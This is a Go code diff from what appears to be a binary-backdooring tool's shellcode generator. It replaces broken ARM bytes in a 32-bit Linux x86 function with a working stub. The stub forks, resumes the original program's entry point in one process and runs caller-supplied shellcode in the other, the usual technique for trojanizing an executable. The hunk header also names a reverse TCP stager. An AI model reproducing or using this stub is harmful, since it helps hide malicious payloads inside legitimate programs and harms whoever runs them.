@@ -84,27 +84,16 @@ func reverse_tcp_stager_linux_intel_32(params api.Parameters) ([]byte, error) {
 
 func user_shellcode_linux_intel_32(params api.Parameters) ([]byte, error) {
 	entry := params.Entry
-	shellcode_vaddr := uint32(0x0)
 	supplied_shellcode := params.ShellCode
 
-	//FORK
-	shellcode1 := "\x00\x40\xa0\xe1" // mov r4, r0
-	shellcode1 += "\x00\x00\x40\xe0" // sub r0, r0, r0
-	shellcode1 += "\x02\x70\xa0\xe3" // mov r7, #2
-	shellcode1 += "\x00\x00\x00\xef" // scv 0
-	shellcode1 += "\x00\x00\x50\xe3" // cmp r0, #
-	shellcode1 += "\x04\x00\xa0\xe1" // mov r0, r4
-	shellcode1 += "\x04\x40\x44\xe0" // sub r4, r4, r4
-	shellcode1 += "\x00\x70\xa0\xe3" // mov r7, #0
-	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
-	// JMP Address = (entrypoint - currentaddress -8)/4
-	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
-	if as, err := api.PackAddr(jmpAddr); err == nil {
+	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
+	shellcode1 += "\xbd"
+	if as, err := api.PackAddr(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
 	}
-	shellcode1 += "\xea" //b entrypoint
+	shellcode1 += "\xff\xe5"
 
 	//SHELLCODE
 	shellcode1 += string(supplied_shellcode)
